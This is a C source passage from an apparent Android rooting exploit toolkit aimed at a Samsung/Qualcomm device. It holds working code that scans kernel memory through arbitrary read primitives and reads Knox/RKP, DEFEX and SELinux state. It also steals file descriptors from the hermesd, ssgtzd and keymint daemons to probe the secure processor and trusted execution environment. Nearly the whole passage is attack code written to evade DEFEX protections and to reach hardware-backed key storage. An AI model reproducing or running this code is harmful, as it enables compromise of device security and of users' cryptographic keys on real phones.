       * checking first 128 bytes of each page for "sp_keymaster" */
      uintptr_t scan_start = 0xffffff8028000000ULL;
      uintptr_t scan_end   = 0xffffff8038000000ULL;
      int pages_scanned = 0;
      int pages_readable = 0;

      for (uintptr_t page = scan_start; page < scan_end; page += PAGE_SIZE) {
        uint8_t probe[128];
        if (root_read_data(fd, page, probe, sizeof(probe))) {
          pages_readable++;
          if (memcmp(probe, "sp_keymaster", 12) == 0 ||
              memmem(probe, sizeof(probe), "sp_keymaster", 12) != NULL) {
            found_addr = page;
            fprintf(hlog, "*** FOUND 'sp_keymaster' at %016llx! ***\n",
                    (unsigned long long)page);
            pr_info("hermes: FOUND sp_keymaster at %016llx!\n",
                    (unsigned long long)page);

            /* Dump 512 bytes around the find */
            uint8_t dump[512];
            root_read_data(fd, page, dump, sizeof(dump));
            fprintf(hlog, "Channel struct dump:\n");
            for (int i = 0; i < 512; i++) {
              if (i % 32 == 0) fprintf(hlog, "  +%04x: ", i);
              fprintf(hlog, "%02x ", dump[i]);
              if (i % 32 == 31) {
                fprintf(hlog, " | ");
                for (int j = i - 31; j <= i; j++)
                  fprintf(hlog, "%c", (dump[j] >= 0x20 && dump[j] < 0x7f) ? dump[j] : '.');
                fprintf(hlog, "\n");
              }
            }
            break;  /* Found it! */
          }
        }
        pages_scanned++;
        if (pages_scanned % 10000 == 0) {
          pr_info("hermes: scanned %d pages, %d readable...\n",
                  pages_scanned, pages_readable);
        }
      }

      if (!found_addr) {
        fprintf(hlog, "sp_keymaster not found in %d pages (%d readable)\n",
                pages_scanned, pages_readable);
      }

      fprintf(hlog, "scan: %d pages checked, %d readable\n",
              pages_scanned, pages_readable);
      } /* end if(0) — disabled scan block */

      /* The old dev_struct read code (for direct-mapped addresses) is kept
       * as fallback in case the scan finds the struct address */
      if (0) { /* DISABLED — page table walk replaces this */
        uint64_t dev_struct = 0;
        if (is_direct_ptr(dev_struct)) {
          /* Dump 8KB of the device struct */
          uint8_t devbuf[8192];
          for (int blk = 0; blk < 64; blk++) {
            root_read_data(fd, dev_struct + blk * 128, devbuf + blk * 128, 128);
          }

          /* Search for channel names */
          fprintf(hlog, "=== SPCOM CHANNEL SCAN ===\n");
          for (int off = 0; off < 8192 - 32; off++) {
            if (memcmp(devbuf + off, "sp_", 3) == 0) {
              /* Found a channel name! */
              char name[33] = {0};
              memcpy(name, devbuf + off, 32);
              name[32] = '\0';
              fprintf(hlog, "  Channel at +0x%04x: '%s'\n", off, name);

              /* Dump surrounding context (128 bytes before + 256 bytes after) */
              int ctx_start = (off > 128) ? off - 128 : 0;
              int ctx_end = off + 256;
              if (ctx_end > 8192) ctx_end = 8192;
              fprintf(hlog, "  Context dump (%d bytes from +0x%04x):\n", ctx_end - ctx_start, ctx_start);
              for (int i = ctx_start; i < ctx_end; i++) {
                if ((i - ctx_start) % 32 == 0)
                  fprintf(hlog, "    +%04x: ", i);
                fprintf(hlog, "%02x ", devbuf[i]);
                if ((i - ctx_start) % 32 == 31) fprintf(hlog, "\n");
              }
              fprintf(hlog, "\n");

              /* Find pointers near the channel name (rpmsg endpoint, etc) */
              for (int j = off - 128; j < off + 256 && j + 8 <= 8192; j += 8) {
                if (j < 0) continue;
                uint64_t val = *(uint64_t*)(devbuf + j);
                if ((val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                  fprintf(hlog, "  Kernel ptr at +%04x: %016llx\n", j, (unsigned long long)val);
                }
              }
              fprintf(hlog, "\n");
            }
          }

          /* Also dump first 512 bytes for structure analysis */
          fprintf(hlog, "\n=== SPCOM DEV STRUCT (first 512 bytes) ===\n");
          for (int i = 0; i < 512; i++) {
            if (i % 32 == 0) fprintf(hlog, "+%04x: ", i);
            fprintf(hlog, "%02x ", devbuf[i]);
            if (i % 32 == 31) {
              fprintf(hlog, " | ");
              for (int j = i - 31; j <= i; j++)
                fprintf(hlog, "%c", (devbuf[j] >= 0x20 && devbuf[j] < 0x7f) ? devbuf[j] : '.');
              fprintf(hlog, "\n");
            }
          }
        } else {
          fprintf(hlog, "spcom device struct pointer invalid!\n");
        }
      } /* end if(0) — disabled old dev_struct block */

      /* Also read DEFEX value (READ only, no write!) */
      #define DEFEX_GLOBAL_FEATURES_OFF (KIMAGE_TEXT_BASE + 0x0172756cULL)
      uint32_t defex_val = root_read32(fd, data_addr(DEFEX_GLOBAL_FEATURES_OFF));
      fprintf(hlog, "\nDEFEX global_features: 0x%x\n", defex_val);

      /* Read RKP/Knox status */
      #define RKP_IMG (KIMAGE_TEXT_BASE + 0x01755000ULL)
      #define KDP_IMG (KIMAGE_TEXT_BASE + 0x01756fe0ULL)
      #define WARR_IMG (KIMAGE_TEXT_BASE + 0x01727564ULL)
      fprintf(hlog, "rkp_started: %u\n", root_read32(fd, data_addr(RKP_IMG)));
      fprintf(hlog, "kdp_enable: %u\n", root_read32(fd, data_addr(KDP_IMG)));
      fprintf(hlog, "warranty_bit: %u\n", root_read32(fd, data_addr(WARR_IMG)));

      fprintf(hlog, "\n=== GOLDEN PATH v5 COMPLETE ===\n");
      fprintf(hlog, "VIVA LA REVOLUTION\n");
      fclose(hlog);
      pr_info("hermes: golden path v5 complete!\n");
    }
  }

  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return socket_ok;
}

/* =================================================================
 * HERMES GOLDEN PATH — Steal hermesd's spcom fd and probe SPU
 * hermesd has /dev/spcom on fd 5, DMA heap on fd 7, qtee on fd 10
 * This runs INSIDE GhostLock so DEFEX can't kill us!
 *
 * JackKnife Studios | Session 13 | Aug 25, 2026
 * VIVA LA REVOLUTION
 * ================================================================= */

/* pidfd syscalls */
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

/* SPCOM ioctl commands */
#define SPCOM_GET_VERSION   0xC0095301
#define SPCOM_IS_CONNECTED  0x80085302
#define SPCOM_CMD16         0xC01053E8
#define SPCOM_REGISTER      0x402053E9
#define SPCOM_SEND_COMMAND  0x402853ED

static pid_t find_pid(const char *name) {
  DIR *d = opendir("/proc");
  if (!d) return 0;
  struct dirent *de;
  pid_t found = 0;
  while ((de = readdir(d)) != NULL) {
    if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
    char path[256], cmdline[256];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", de->d_name);
    int fd = open(path, O_RDONLY);
    if (fd < 0) continue;
    ssize_t n = read(fd, cmdline, sizeof(cmdline) - 1);
    close(fd);
    if (n <= 0) continue;
    cmdline[n] = '\0';
    if (strstr(cmdline, name)) {
      found = atoi(de->d_name);
      break;
    }
  }
  closedir(d);
  return found;
}

static int steal_fd(pid_t target, int target_fd) {
  int pidfd = syscall(SYS_pidfd_open, target, 0);
  if (pidfd < 0) return -1;
  int fd = syscall(SYS_pidfd_getfd, pidfd, target_fd, 0);
  close(pidfd);
  return fd;
}

static void hermes_hexdump(FILE *f, const char *label,
                           const void *data, size_t len) {
  const uint8_t *p = data;
  fprintf(f, "\n--- %s (%zu bytes) ---\n", label, len);
  for (size_t i = 0; i < len && i < 256; i++) {
    if (i % 16 == 0) fprintf(f, "  %04zx: ", i);
    fprintf(f, "%02x ", p[i]);
    if (i % 16 == 15 || i == len - 1) {
      for (size_t j = (i % 16) + 1; j < 16; j++) fprintf(f, "   ");
      fprintf(f, " | ");
      size_t s = i - (i % 16);
      for (size_t j = s; j <= i; j++)
        fprintf(f, "%c", (p[j] >= 0x20 && p[j] < 0x7f) ? p[j] : '.');
      fprintf(f, "\n");
    }
  }
  if (len > 256) fprintf(f, "  ... (%zu more bytes)\n", len - 256);
}

static void hermes_golden_path(void) {
  FILE *log = fopen("/data/local/tmp/hermes_golden.txt", "w");
  if (!log) {
    pr_info("hermes: can't open log file\n");
    return;
  }

  fprintf(log, "╔══════════════════════════════════════════════╗\n");
  fprintf(log, "║  HERMES GOLDEN PATH — JackKnife Studios     ║\n");
  fprintf(log, "║  SPCOM Protocol Capture via fd-steal         ║\n");
  fprintf(log, "║  VIVA LA REVOLUTION                         ║\n");
  fprintf(log, "╚══════════════════════════════════════════════╝\n\n");

  /* Find hermesd */
  pid_t hermes_pid = find_pid("hermesd");
  fprintf(log, "hermesd PID: %d\n", hermes_pid);
  pr_info("hermes: PID=%d\n", hermes_pid);

  if (!hermes_pid) {
    fprintf(log, "[-] hermesd not found!\n");
    fclose(log);
    return;
  }

  /* Find ssgtzd too */
  pid_t ssgtzd_pid = find_pid("ssgtzd");
  fprintf(log, "ssgtzd PID: %d\n", ssgtzd_pid);

  /* Find keymint-service-spu */
  pid_t keymint_pid = find_pid("keymint-service-spu");
  fprintf(log, "keymint-spu PID: %d\n\n", keymint_pid);

  /* === STEAL HERMESD FDs === */
  fprintf(log, "=== STEALING HERMESD FILE DESCRIPTORS ===\n");

  int spcom_fd = steal_fd(hermes_pid, 5);   /* /dev/spcom */
  int hermes_fd = steal_fd(hermes_pid, 6);  /* anon_inode:hermesd */
  int dma_fd = steal_fd(hermes_pid, 7);     /* dma_heap */
  int qtee_fd = steal_fd(hermes_pid, 10);   /* qtee */

  fprintf(log, "  spcom fd 5 → local %d %s\n", spcom_fd,
          spcom_fd >= 0 ? "OK" : strerror(errno));
  fprintf(log, "  hermes fd 6 → local %d %s\n", hermes_fd,
          hermes_fd >= 0 ? "OK" : strerror(errno));
  fprintf(log, "  dma fd 7 → local %d %s\n", dma_fd,
          dma_fd >= 0 ? "OK" : strerror(errno));
  fprintf(log, "  qtee fd 10 → local %d %s\n\n", qtee_fd,
          qtee_fd >= 0 ? "OK" : strerror(errno));

  pr_info("hermes: stolen fds spcom=%d hermes=%d dma=%d qtee=%d\n",
          spcom_fd, hermes_fd, dma_fd, qtee_fd);

  /* === PROBE SPCOM FD === */
  if (spcom_fd >= 0) {
    fprintf(log, "=== SPCOM FD PROBING (stolen from hermesd) ===\n");

    /* GET_VERSION */
    uint8_t ver[16] = {0};
    int rc = ioctl(spcom_fd, SPCOM_GET_VERSION, ver);
    fprintf(log, "GET_VERSION: rc=%d errno=%d\n", rc, errno);
    if (rc >= 0) hermes_hexdump(log, "SPU VERSION", ver, 16);

    /* IS_CONNECTED */
    uint8_t conn[16] = {0};
    rc = ioctl(spcom_fd, SPCOM_IS_CONNECTED, conn);
    fprintf(log, "IS_CONNECTED: rc=%d errno=%d\n", rc, errno);
    if (rc >= 0) hermes_hexdump(log, "CONNECTED", conn, 16);

    /* CMD16 with cmd=0x64 (the one that responds) */
    uint8_t cmd16[16] = {0};
    cmd16[0] = 0x64;
    rc = ioctl(spcom_fd, SPCOM_CMD16, cmd16);
    fprintf(log, "CMD16(0x64): rc=%d errno=%d\n", rc, errno);
    hermes_hexdump(log, "CMD16 RESPONSE", cmd16, 16);

    /* Try reading pending data (non-blocking) */
    int flags = fcntl(spcom_fd, F_GETFL);
    fcntl(spcom_fd, F_SETFL, flags | O_NONBLOCK);
    uint8_t rbuf[4096];
    ssize_t n = read(spcom_fd, rbuf, sizeof(rbuf));
    fprintf(log, "read(): %zd errno=%d\n", n, errno);
    if (n > 0) hermes_hexdump(log, "PENDING SPCOM DATA", rbuf, n);
    fcntl(spcom_fd, F_SETFL, flags); /* restore */

    /* Try REGISTER as a new channel name */
    struct {
      char name[32];
    } reg = {0};
    strncpy(reg.name, "sp_hermes_jk", sizeof(reg.name));
    rc = ioctl(spcom_fd, SPCOM_REGISTER, &reg);
    fprintf(log, "REGISTER 'sp_hermes_jk': rc=%d errno=%d\n", rc, errno);

    /* Probe additional CMD16 commands */
    fprintf(log, "\n=== CMD16 COMMAND SCAN ===\n");
    for (int cmd = 0; cmd < 16; cmd++) {
      uint8_t probe[16] = {0};
      probe[0] = cmd;
      /* Use alarm to prevent D-state hang */
      alarm(3);
      rc = ioctl(spcom_fd, SPCOM_CMD16, probe);
      alarm(0);
      if (rc >= 0 || errno != EINTR) {
        fprintf(log, "  CMD16[0x%02x]: rc=%d errno=%d", cmd, rc, errno);
        if (rc >= 0 && (probe[0] || probe[1] || probe[2] || probe[3])) {
          fprintf(log, " → %02x%02x%02x%02x %02x%02x%02x%02x",
                  probe[0], probe[1], probe[2], probe[3],
                  probe[4], probe[5], probe[6], probe[7]);
        }
        fprintf(log, "\n");
      } else {
        fprintf(log, "  CMD16[0x%02x]: TIMEOUT (alarm)\n", cmd);
      }
    }

    close(spcom_fd);
    fprintf(log, "\n");
  }

  /* === PROBE HERMESD ANON FD === */
  if (hermes_fd >= 0) {
    fprintf(log, "=== HERMESD ANON FD PROBING ===\n");

    /* Try basic ioctls */
    uint8_t buf[256] = {0};
    int rc = ioctl(hermes_fd, 0xC0095301, buf);  /* GET_VERSION on hermes? */
    fprintf(log, "hermes GET_VERSION: rc=%d errno=%d\n", rc, errno);

    rc = ioctl(hermes_fd, 0x80085302, buf);  /* IS_CONNECTED? */
    fprintf(log, "hermes IS_CONNECTED: rc=%d errno=%d\n", rc, errno);

    /* Try reading */
    int flags = fcntl(hermes_fd, F_GETFL);
    fcntl(hermes_fd, F_SETFL, flags | O_NONBLOCK);
    ssize_t n = read(hermes_fd, buf, sizeof(buf));
    fprintf(log, "hermes read(): %zd errno=%d\n", n, errno);
    if (n > 0) hermes_hexdump(log, "HERMES DATA", buf, n);
    fcntl(hermes_fd, F_SETFL, flags);

    close(hermes_fd);
    fprintf(log, "\n");
  }

  /* === PROBE QTEE FD === */
  if (qtee_fd >= 0) {
    fprintf(log, "=== QTEE FD PROBING ===\n");

    /* smcinvoke probe - op=0 with no args (safe) */
    uint8_t invoke[256] = {0};
    int rc = ioctl(qtee_fd, 0xC0106900, invoke);
    fprintf(log, "SMCINVOKE_INVOKE: rc=%d errno=%d\n", rc, errno);
    if (rc >= 0) hermes_hexdump(log, "SMCINVOKE RESPONSE", invoke, 64);

    close(qtee_fd);
    fprintf(log, "\n");
  }

  /* === ALSO STEAL FROM ssgtzd AND keymint-spu === */
  if (ssgtzd_pid) {
    fprintf(log, "=== ssgtzd FD STEAL ===\n");
    /* ssgtzd fd 4 is primary spcom */
    int ssg_spcom = steal_fd(ssgtzd_pid, 4);
    fprintf(log, "ssgtzd fd 4 → local %d %s\n", ssg_spcom,
            ssg_spcom >= 0 ? "OK" : strerror(errno));
    if (ssg_spcom >= 0) {
      uint8_t ver[16] = {0};
      int rc = ioctl(ssg_spcom, SPCOM_GET_VERSION, ver);
      fprintf(log, "  GET_VERSION: rc=%d\n", rc);
      if (rc >= 0) hermes_hexdump(log, "ssgtzd SPU VERSION", ver, 16);

      uint8_t conn[16] = {0};
      rc = ioctl(ssg_spcom, SPCOM_IS_CONNECTED, conn);
      fprintf(log, "  IS_CONNECTED: rc=%d\n", rc);
      if (rc >= 0) hermes_hexdump(log, "ssgtzd CONNECTED", conn, 16);

      close(ssg_spcom);
    }
    fprintf(log, "\n");
  }

  if (keymint_pid) {
    fprintf(log, "=== keymint-spu FD STEAL ===\n");
    /* keymint-spu uses qtee fds 10-15 */
    for (int tfd = 10; tfd <= 15; tfd++) {
      int stolen = steal_fd(keymint_pid, tfd);
      if (stolen >= 0) {
        fprintf(log, "keymint fd %d → local %d\n", tfd, stolen);
        /* Quick smcinvoke probe */
        uint8_t buf[64] = {0};
        int rc = ioctl(stolen, 0xC0106900, buf);
        fprintf(log, "  SMCINVOKE: rc=%d errno=%d\n", rc, errno);
        close(stolen);
      }
    }
    fprintf(log, "\n");
  }

  fprintf(log, "=== HERMES GOLDEN PATH COMPLETE ===\n");
  fprintf(log, "VIVA LA REVOLUTION\n");
  fclose(log);

  pr_info("hermes: golden path results in /data/local/tmp/hermes_golden.txt\n");
}

/* SPCOM channel state dump + reset — for second-run mode */
#define SPCOM_DEV_ADDR 0xffffffd2cc898020ULL
static void dump_spcom_state(int fd) {
  /* Read spcom_dev pointer */
  uint64_t dev_ptr = root_read64(fd, data_addr(SPCOM_DEV_ADDR));
  pr_info("spcom: dev_ptr = %016llx\n", (unsigned long long)dev_ptr);
  if (!is_direct_ptr(dev_ptr)) {
    pr_info("spcom: dev_ptr invalid, skipping\n");
    return;
  }

  /* Dump 4KB of device struct to file for analysis */
  FILE *dump = fopen("/data/local/tmp/spcom_dump.bin", "wb");
  FILE *txt = fopen("/data/local/tmp/spcom_dump.txt", "w");
  if (!dump || !txt) {
    pr_info("spcom: can't open dump files\n");
    if (dump) fclose(dump);
    if (txt) fclose(txt);
    return;
  }

  uint8_t buf[4096];
  for (int block = 0; block < 32; block++) {
    uintptr_t addr = dev_ptr + block * 128;
    root_read_data(fd, addr, buf + block * 128, 128);
  }
  fwrite(buf, 1, 4096, dump);
  fclose(dump);

  /* Search for "sp_keymaster" in the dump */
  fprintf(txt, "=== SPCOM DEVICE STRUCT DUMP ===\n");
  fprintf(txt, "dev_ptr = %016llx\n\n", (unsigned long long)dev_ptr);

  for (int off = 0; off < 4096 - 16; off++) {
    if (memcmp(buf + off, "sp_keymaster", 12) == 0) {
      fprintf(txt, "*** FOUND 'sp_keymaster' at offset 0x%x ***\n", off);
      fprintf(txt, "Channel struct dump (256 bytes from offset 0x%x):\n", off);

      /* Dump 256 bytes around the channel name */
      int start = (off > 64) ? off - 64 : 0;
      for (int i = start; i < start + 256 && i < 4096; i++) {
        if ((i - start) % 16 == 0)
          fprintf(txt, "  +%04x: ", i);
        fprintf(txt, "%02x ", buf[i]);
        if ((i - start) % 16 == 15) {
          fprintf(txt, " | ");
          for (int j = i - 15; j <= i; j++) {
            char c = buf[j];
            fprintf(txt, "%c", (c >= 0x20 && c < 0x7f) ? c : '.');
          }
          fprintf(txt, "\n");
        }
      }
      fprintf(txt, "\n");

      /* Look for lock/state values near the channel name */
      /* Mutex on arm64: first 8 bytes = {owner: 8 bytes} */
      /* State value: small integer (0-5 typically) */
      /* Completion: {done: 4 bytes, wait: ...} */
      for (int j = off - 64; j < off + 192 && j + 8 <= 4096; j += 4) {
        uint32_t v = *(uint32_t*)(buf + j);
        uint64_t v64 = *(uint64_t*)(buf + j);

        /* Look for potential mutex (owner = task_struct pointer) */
        if ((v64 & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
          fprintf(txt, "  Potential mutex/ptr at +%04x: %016llx\n",
                  j, (unsigned long long)v64);
        }
        /* Look for small integers (state, done count) */
        if (v >= 1 && v <= 10 && j >= off + 32) {
          fprintf(txt, "  Potential state at +%04x: %u\n", j, v);
        }
      }
    }
  }

  /* Also dump first 512 bytes as hex for structure analysis */
  fprintf(txt, "\n=== First 512 bytes of device struct ===\n");
  for (int i = 0; i < 512; i++) {
    if (i % 32 == 0) fprintf(txt, "+%04x: ", i);
    fprintf(txt, "%02x ", buf[i]);
    if (i % 32 == 31) fprintf(txt, "\n");
  }

  fclose(txt);
  pr_info("spcom: dump written to /data/local/tmp/spcom_dump.txt\n");
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);

  /* SECOND RUN MODE: if su_daemon is already running,
   * skip UMH setup and use pipe physrw for spcom analysis */
  if (root_socket_ready()) {
    pr_info("root: su_daemon ALREADY RUNNING — entering kernel R/W mode\n");

    /* Dump spcom driver state */
    dump_spcom_state(fd);

    /* HERMES GOLDEN PATH — steal hermesd fds and probe SPU */
    pr_info("hermes: launching golden path (second-run mode)\n");
    hermes_golden_path();

    /* AVC stealth root attempt */
    uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
    uint8_t cur_enforce = 0;
    kernel_read_data(fd, selinux_addr, &cur_enforce, sizeof(cur_enforce));
    pr_info("root: current enforcing=%u\n", cur_enforce);

    root_child_done = 1;
    root_uid_after = 0;
    return 1;
  }

  return install_workqueue_umh_root(fd);
}
